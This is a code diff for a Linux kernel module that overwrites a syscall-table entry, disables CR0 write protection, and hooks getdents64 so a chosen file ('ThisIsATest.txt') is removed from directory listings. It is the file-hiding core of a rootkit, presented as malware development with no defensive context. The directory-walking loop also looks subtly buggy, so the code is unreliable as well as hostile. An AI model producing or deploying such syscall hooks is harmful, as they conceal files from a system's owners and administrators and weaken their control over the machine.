@@ -1,14 +1,5 @@
-#include <linux/init.h>
 #include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/errno.h>
-#include <linux/types.h>
-#include <linux/unistd.h>
-#include <asm/cacheflush.h>
-#include <asm/page.h>
-#include <asm/current.h>
-#include <linux/sched.h>
-#include <linux/kallsyms.h>
+#include <asm/unistd.h>
  
 int new_getdents64(const struct pt_regs *regs);
 int load(void);
@@ -17,7 +8,15 @@ void unload(void);
 typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
 static unsigned long *syscall_table = (unsigned long *)0xffffffff9d0001a0; 
 static original_getdents64_t original_getdents64_ptr;
+static char *file_name_to_hide = "ThisIsATest.txt";
  
+struct linux_dirent {
+	unsigned long  d_ino;     /* Inode number */
+        unsigned long  d_off;     /* Offset to next linux_dirent */
+        unsigned short d_reclen;  /* Length of this linux_dirent */
+        char           d_name[];  /* Filename (null-terminated) */
+};
+
 static inline void wp_cr0(unsigned long val) {
     __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
 }
@@ -33,8 +32,28 @@ static inline void one_cr0(void) {
 }
 
 asmlinkage int new_getdents64(const struct pt_regs *regs) {
-    printk(KERN_ALERT "Hijacked!");
-    return original_getdents64_ptr(regs);
+    struct linux_dirent *buff = (struct linux_dirent*)regs->si;
+    int total_bytes_read = (int)original_getdents64_ptr(regs);
+
+    int i;
+    for (i=0; i < total_bytes_read; i++) {
+        int length = buff->d_reclen;
+        struct linux_dirent *next = (struct linux_dirent*)((char*)regs->si + i);
+        if (!strcmp(buff->d_name, file_name_to_hide)) {
+            // File matches name to hide, we need to delete it from the array.
+            int length_to_copy = total_bytes_read - i - length;
+            memmove(buff, next, length_to_copy);
+
+            // Array has been shortened by the length of the member we've just deleted.
+            total_bytes_read -= length;
+        }
+
+        i += length;
+        // Add the bytes read to si so buff will point to the next member in the array.
+        buff = next;
+    }
+
+    return total_bytes_read;
 }
  
 int load(void) {
